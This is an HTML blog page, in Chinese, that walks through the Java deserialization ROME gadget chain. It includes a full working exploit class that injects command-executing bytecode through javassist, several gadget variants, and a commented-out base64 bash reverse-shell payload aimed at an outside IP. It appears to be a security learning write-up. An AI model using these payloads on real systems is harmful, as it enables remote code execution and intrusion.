@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>java反序列化之ROME链 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">java反序列化之ROME链</h1>
+    <div class="post-meta">
+      <time datetime="2025-07-12">2025-07-12</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18980376">https://www.cnblogs.com/Zephyr07/articles/18980376</a></p>
+</blockquote>
+<h2 id="前情提要："><a href="#前情提要：" class="headerlink" title="前情提要："></a>前情提要：</h2><p>ROME是一个可以兼容多种格式的feeds解析器，可以将一种对象转换成另一种格式(指定格式或java对象)</p>
+<p>他提供了ToStringBean这个类，提供深入的toString方法对javaBean进行操作</p>
+<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>jdk8u65</p>
+<p>pom.xml：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;3.28.0-GA&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="流程分析："><a href="#流程分析：" class="headerlink" title="流程分析："></a>流程分析：</h2><p>首先是从导入的rome包里面看一眼，搜一下相关关键字发现什么都没有，比如jndi关键字</p>
+<p>其实这里是因为rome包只是这个链子的一部分也就是一个sink，是因为有他才完善了一条链子　</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173527900-2095828131.png"></p>
+<p>这里看其他师傅的链尾是TemplatesImpl.getOutputProperties()，很熟悉，在cc里面见过，这里我们按照常规思路应该是去找find usages，但是发现找不到</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173538440-1606702159.png"></p>
+<p>这里很厉害的一个地方就是链子的下一步是(在rome包里面)ToStringBean.toString()，看一下</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173545926-1619510966.png"></p>
+<p>发现就是BeanIntrospector.getPropertyDescriptors(_beanClass)获取一个_beanClass中的getter方法，如果不为空且能调用该方法且可以传参，判断完之后就会执行invoke</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object value = pReadMethod.invoke(_obj,NO_PARAMS);</span><br></pre></td></tr></table></figure>
+
+<p>这里看到invoke其实有的人就有可能知道为什么链尾是tostring了，因为该invoke是可以触发<code>TemplatesImpl.getOutputProperties()</code> 的方法的</p>
+<p>然后跟进去看一下_beanClass和_obj在构造函数的时候就会被赋值</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173553629-1410173602.png"></p>
+<p>那现在就是去找谁调用tostring了，这用到了rome包中的类<code>EqualsBean</code> ，跟进去看一下发现有一个hashcode方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173601269-1791022845.png"></p>
+<p>看到这个方法就可以想到我们之前学习cc链的时候的hashmap相关的那条链，这里也是完美契合的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173608012-1537460544.png"></p>
+<p>原生exp编写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;  </span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;  </span><br><span class="line">import javassist.ClassPool;  </span><br><span class="line">import javassist.CtClass;  </span><br><span class="line">import javassist.CtConstructor;  </span><br><span class="line">  </span><br><span class="line">import java.io.*;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line">public class RomEXP &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception&#123;  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;Drunkbaby&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">        Class c = templates.getClass();  </span><br><span class="line">        Field byteCodesField = c.getDeclaredField(&quot;_bytecodes&quot;);  </span><br><span class="line">        byteCodesField.setAccessible(true);  </span><br><span class="line">        byte[] evil = getTemplatesImpl(&quot;Calc&quot;);  </span><br><span class="line">        byte[][] codes = &#123;evil&#125;;  </span><br><span class="line">        byteCodesField.set(templates,codes);  </span><br><span class="line">//        templates.newTransformer();  </span><br><span class="line"> 		ToStringBean toStringBean = new ToStringBean(c,templates);  </span><br><span class="line">//        toStringBean.toString();  </span><br><span class="line"> 		Class toStringBeanEvil = toStringBean.getClass();  </span><br><span class="line">        EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(equalsBean,&quot;Zephyr&quot;);  </span><br><span class="line">        serialize(hashMap);  </span><br><span class="line">        unserialize(&quot;ser.bin&quot;);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static byte[] getTemplatesImpl(String cmd) &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            ClassPool pool = ClassPool.getDefault();  </span><br><span class="line">            CtClass ctClass = pool.makeClass(&quot;Evil&quot;);  </span><br><span class="line">            CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);  </span><br><span class="line">            ctClass.setSuperclass(superClass);  </span><br><span class="line">            CtConstructor constructor = ctClass.makeClassInitializer();  </span><br><span class="line">            constructor.setBody(&quot; try &#123;\n&quot; +  </span><br><span class="line">                    &quot; Runtime.getRuntime().exec(\&quot;&quot; + cmd +  </span><br><span class="line">                    &quot;\&quot;);\n&quot; +  </span><br><span class="line">                    &quot; &#125; catch (Exception ignored) &#123;\n&quot; +  </span><br><span class="line">                    &quot; &#125;&quot;);  </span><br><span class="line">            // &quot;new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;  </span><br><span class="line"> 			byte[] bytes = ctClass.toBytecode();  </span><br><span class="line">            ctClass.defrost();  </span><br><span class="line">            return bytes;  </span><br><span class="line">        &#125; catch (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            return new byte[]&#123;&#125;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">        Class clazz = object.getClass();  </span><br><span class="line">        Field field = clazz.getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;  </span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  </span><br><span class="line">        Object obj = ois.readObject();  </span><br><span class="line">        return obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="其它利用链："><a href="#其它利用链：" class="headerlink" title="其它利用链："></a>其它利用链：</h2><h3 id="1-用objectBean替换equalsbean"><a href="#1-用objectBean替换equalsbean" class="headerlink" title="1.用objectBean替换equalsbean"></a>1.用objectBean替换equalsbean</h3><p>exp基本不变，就变了一句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectBean objectBean = new ObjectBean(toStringBeanEvil,toStringBean);  </span><br><span class="line">HashMap hashMap = new HashMap();  </span><br><span class="line">hashMap.put(objectBean,&quot;Zephyr&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-用hashtable替换hashmap"><a href="#2-用hashtable替换hashmap" class="headerlink" title="2.用hashtable替换hashmap"></a>2.用hashtable替换hashmap</h3><p>和之前一条cc链差不多，现在的poc里面hashmap会有一个put的操作，但是在hashtable里面，对于hashtable的每个元素，都会调用reconstitutionPut方法，具体的可以自己再去跟一下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hashtable hashtable= new Hashtable();  </span><br><span class="line">hashtable.put(equalsBean,&quot;Zephyr&quot;);  </span><br><span class="line">serialize(hashtable);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-BadAttributeValueExpException-利用链"><a href="#3-BadAttributeValueExpException-利用链" class="headerlink" title="3.BadAttributeValueExpException 利用链"></a>3.BadAttributeValueExpException 利用链</h3><p>不知道大家还是否记得在cc中有个类也可以调用tostring方法，就是BadAttributeValueExpException类的readobject中可以调用任意类的tostring()方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173618025-623084342.png"></p>
+<p>替换exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);  </span><br><span class="line">serialize(badAttributeValueExpException);  </span><br><span class="line">unserialize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>替换下面照片中红色的一块</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250717173627009-2018029916.png"></p>
+<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>上述代码都是用javassist生成的恶意字节码，因为javassist 缩短 payload 长度</p>
+<p>原因是：</p>
+<p><strong>传统 Java 编译会包含调试信息、行号表、局部变量表等，而 Javassist 可以在生成时移除这些信息</strong></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>总体来说，这条链还是简单一点，主要就是用到了rome包中的两个类来作为这条链的sink~</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/07/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-structS2-001%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E6%96%B0%E7%89%88idea-%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="prev">← Java反序列化之 structS2-001环境搭建(新版idea)和漏洞复现</a>
+    
+    
+      <a href="/2025/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/" class="next">Java反序列化之C3P0链 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
